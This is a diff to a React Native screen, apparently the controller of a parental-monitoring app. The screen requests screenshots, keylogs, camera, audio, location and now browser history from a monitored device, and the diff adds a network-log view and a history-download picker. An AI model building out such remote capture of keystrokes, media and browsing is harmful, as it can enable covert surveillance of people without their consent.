@@ -3,6 +3,7 @@ import { Pressable, Text, Modal, Image, ScrollView } from "react-native";
 import { SafeAreaView } from "react-native-safe-area-context";
 import { View, FlatList, StyleSheet } from "react-native-web";
 import { FontAwesome, MaterialIcons } from "@expo/vector-icons";
+import { Picker } from "@react-native-picker/picker";
 import base64 from "react-native-base64";
 import ParentMenu from "../components/ParentMenu";
 import { handleRefresh, removeNonAscii } from "../config/Utils";
@@ -10,19 +11,22 @@ import {
   addRequest,
   getSpecificData,
   deleteData,
+  deleteAllData,
 } from "../components/FetchRequest";
 import { GoBackButton } from "../components/Buttons";
 import global from "../config/global";
 import colors from "../config/colors";
 import sizes from "../config/sizes";
 
-// Screenshot, Keylog, Camera, Audio and Location requests page
+// Screenshot, Keylog, Camera, Audio, Location and History requests page
 
 const ImmediatelyRequest = ({ route, navigation }) => {
   const [data, setData] = useState([]);
   const [specificData, setSpecificData] = useState([]);
+  const [browser, setBrowser] = useState("");
   const [refresh, setRefresh] = useState(true);
   const [modalVisible, setModalVisible] = useState(false);
+  const [historyModalVisible, setHistoryModalVisible] = useState(false);
   const { uid } = route.params;
   const { name } = route.params;
   const { type } = route.params;
@@ -80,8 +84,26 @@ const ImmediatelyRequest = ({ route, navigation }) => {
             </View>
           </View>
         );
+      case "NETLOG":
+        let decodedNetLog = base64.decode(specificData.toString());
+        return (
+          <ScrollView>
+            <Text>
+              {(decodedNetLog)
+                .replace(/Subject/g, "")
+                .replace(/: CN=/g, "")
+                .replace(/O=/g, "")
+                .replace(/OU=/g, "")
+                .replace(/L=/g, "")
+                .replace(/S=/g, "")
+                .replace(/C=/g, "")
+                .replace(/\"/g, "")
+                .replace(/,/g, "")
+              }
+            </Text>
+          </ScrollView>
+        );
       default: {
-        //text
         let decodedData = base64.decode(specificData.toString());
         return (
           <ScrollView>
@@ -92,10 +114,36 @@ const ImmediatelyRequest = ({ route, navigation }) => {
     }
   };
 
+  const setHistory = () => {
+    return (
+      <View>
+        <Picker
+          style={global.TextInput}
+          selectedValue={browser}
+          onValueChange={(itemValue, itemIndex) => setBrowser(itemValue)}
+        >
+          <Picker.Item label="Chrome" value="Chrome" />
+          <Picker.Item label="Opera" value="Opera" />
+          <Picker.Item label="Brave" value="Brave" />
+          <Picker.Item label="Edge" value="Edge" />
+        </Picker>
+      </View>
+    );
+  };
+
   const checkRequestButton = () => {
     switch (type) {
       case "KEYLOG":
         break;
+      case "NETLOG":
+        return (
+          <Pressable
+            onPress={() => setHistoryModalVisible(true)}
+            style={styles.AddRequestButton}
+          >
+            <Text style={global.ButtonText}>Download browser history</Text>
+          </Pressable>
+        );
       default:
         let dataAttr = { REQUEST_TYPE: type };
         return (
@@ -117,17 +165,6 @@ const ImmediatelyRequest = ({ route, navigation }) => {
       <View style={global.RightContainer}>
         <View>
           <GoBackButton navigation={navigation} uid={uid} name={name} />
-          <Pressable
-            style={global.RefreshButton}
-            onPress={() => handleRefresh(setRefresh)}
-          >
-            <FontAwesome
-              style={global.icon}
-              name="refresh"
-              size={sizes.refreshIconSize}
-              color={colors.primary}
-            />
-          </Pressable>
         </View>
         <View style={global.HeaderMenu}>
           <Text style={global.HeaderText}>
@@ -136,6 +173,16 @@ const ImmediatelyRequest = ({ route, navigation }) => {
         </View>
         <View style={global.RightMenu}>
           <View style={global.ArrowView}>
+            <Pressable
+              style={global.ArrowButton}
+              onPress={() => deleteAllData(uid, type.toUpperCase(), setRefresh)}
+            >
+              <MaterialIcons
+                name="delete-sweep"
+                size={sizes.iconSize}
+                color={colors.primary}
+              />
+            </Pressable>
             <Pressable
               style={global.ArrowButton}
               //onPress={() => handlePreviousPage()}
@@ -153,6 +200,17 @@ const ImmediatelyRequest = ({ route, navigation }) => {
               <MaterialIcons
                 name="navigate-next"
                 size={sizes.PagingArrowIconSize}
+                color={colors.primary}
+              />
+            </Pressable>
+            <Pressable
+              style={global.ArrowButton}
+              onPress={() => handleRefresh(setRefresh)}
+            >
+              <FontAwesome
+                style={global.icon}
+                name="refresh"
+                size={sizes.refreshIconSize}
                 color={colors.primary}
               />
             </Pressable>
@@ -200,8 +258,39 @@ const ImmediatelyRequest = ({ route, navigation }) => {
                   <Pressable
                     style={global.CloseButton}
                     onPress={() => {
-                      setModalVisible(!modalVisible), snd.load();
+                      setModalVisible(!modalVisible);
                     }}
+                  >
+                    <Text style={global.ButtonText}>Close</Text>
+                  </Pressable>
+                </View>
+              </View>
+            </View>
+          </Modal>
+          <Modal /* Modal for History */
+            style={global.Modal}
+            animationType="fade"
+            transparent={true}
+            visible={historyModalVisible}
+            onRequestClose={() => {
+              setHistoryModalVisible(!historyModalVisible);
+            }}
+          >
+            <View style={global.ModalView}>
+              <View style={global.ModalConfigContainer}>
+                <View style={global.TopModalView}>{setHistory()}</View>
+                <View style={global.BottomModalView}>
+                  <Pressable
+                    onPress={() => {
+                      //defineTypeAttributes();
+                    }}
+                    style={global.CloseButton}
+                  >
+                    <Text style={global.ButtonText}>Send</Text>
+                  </Pressable>
+                  <Pressable
+                    style={global.CloseButton}
+                    onPress={() => setHistoryModalVisible(!historyModalVisible)}
                   >
                     <Text style={global.ButtonText}>Close</Text>
                   </Pressable>
